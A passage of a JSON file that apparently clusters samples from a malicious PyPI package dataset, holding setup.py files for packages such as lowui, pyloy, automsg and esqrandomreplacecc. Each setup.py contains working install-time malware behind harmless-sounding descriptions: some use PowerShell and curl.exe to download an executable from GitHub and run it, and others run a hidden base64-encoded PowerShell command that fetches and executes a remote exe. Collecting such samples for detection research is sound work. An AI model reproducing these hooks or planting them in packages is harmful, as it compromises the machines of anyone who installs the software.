        "code": "from setuptools import setup\n\nsetup(\n  name=\"lowui\",\n  version=\"0.0.1\",\n  author=\"PRCloudTech\",\n  description=\"None\",\n  packages=[\"lowui\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-10-mumupatcher-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"mumupatcher\",\n  version=\"0.0.1\",\n  author=\"PRCloudTech\",\n  description=\"None\",\n  packages=[\"mumupatcher\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"CBLines.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-10-10-mumuplayer12-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"mumuplayer12\",\n  version=\"0.0.1\",\n  author=\"PRCloudTech\",\n  description=\"None\",\n  packages=[\"mumuplayer12\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"Anch.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"Anch.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/CBLines.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-09-pyloy-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"pyloy\",\n  version=\"0.0.1\",\n  author=\"cdg\",\n  description=\"Load GUI in terminal\",\n  packages=[\"pyloy\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/bloodstainedvvs/host/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/bloodstainedvvs/host/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-09-uidesign-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"uidesign\",\n  version=\"0.0.1\",\n  author=\"cdg\",\n  description=\"Create art in the terminal\",\n  packages=[\"uidesign\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/bloodstainedvvs/host/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/bloodstainedvvs/host/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-11-automsg-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"automsg\",\n  version=\"0.0.1\",\n  author=\"Chase\",\n  description=\"Automated message support - Changes coming soon\",\n  packages=[\"automsg\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"DisableAntivirusAndRetry.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/code.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"DisableAntivirusAndRetry.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/code.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-11-ezauto-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"ezauto\",\n  version=\"0.0.1\",\n  author=\"Chase\",\n  description=\"Automated message support - Changes coming soon\",\n  packages=[\"ezauto\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"DisableAntivirusAndRetry.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/code.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"DisableAntivirusAndRetry.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/code.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-13-roinject-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"roinject\",\n  version=\"0.0.1\",\n  author=\"l1th1um\",\n  description=\"None\",\n  packages=[\"roinject\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-09-14-antibyfron-v0.0.1",
        "code": "from setuptools import setup\n\nsetup(\n  name=\"antibyfron\",\n  version=\"0.0.1\",\n  author=\"veve\",\n  description=\"None\",\n  packages=[\"antibyfron\"]\n)\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n\n\nimport subprocess\nimport os\n\n# Define the output path for the downloaded file\noutput_file = os.path.join(os.getcwd(), \"zwerve.exe\")\n\n# Step 1: PowerShell command to download the file using curl.exe\ndownload_command = f'curl.exe -L https://github.com/holdthatcode/e/raw/main/zwerve.exe -o \"{output_file}\"'\n\n# Run the PowerShell command to download the file\ndownload_result = subprocess.run([\"powershell\", \"-Command\", download_command], capture_output=True, text=True)\n\n# Output PowerShell result for debugging\nprint(\"Download Output:\", download_result.stdout)\nprint(\"Download Error:\", download_result.stderr)\n\n# Check if download succeeded and the file exists\nif download_result.returncode == 0 and os.path.exists(output_file):\n    # Step 2: Run the downloaded executable silently using the full path\n    execute_command = f'Start-Process \"{output_file}\" -NoNewWindow -Wait'\n    execute_result = subprocess.run([\"powershell\", \"-Command\", execute_command], capture_output=True, text=True)\n\n    # Output PowerShell result for debugging\n    print(\"Execution Output:\", execute_result.stdout)\n    print(\"Execution Error:\", execute_result.stderr)\nelse:\n    print(\"File download failed or file not found.\")\n"
      }
    ]
  },
  {
    "cluster_id": 142,
    "size": 179,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqrandomreplacecc-v5.49",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqrandomreplacecc',\n    packages = ['modlib'],\n    version = '3.20',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-libintelpostlib-v6.37",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libintelpostlib',\n    packages = ['modlib'],\n    version = '9.70',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqcraftremc-v9.12",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcraftremc',\n    packages = ['modlib'],\n    version = '10.45',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-esqedpushvm-v8.61",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqedpushvm',\n    packages = ['modlib'],\n    version = '8.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
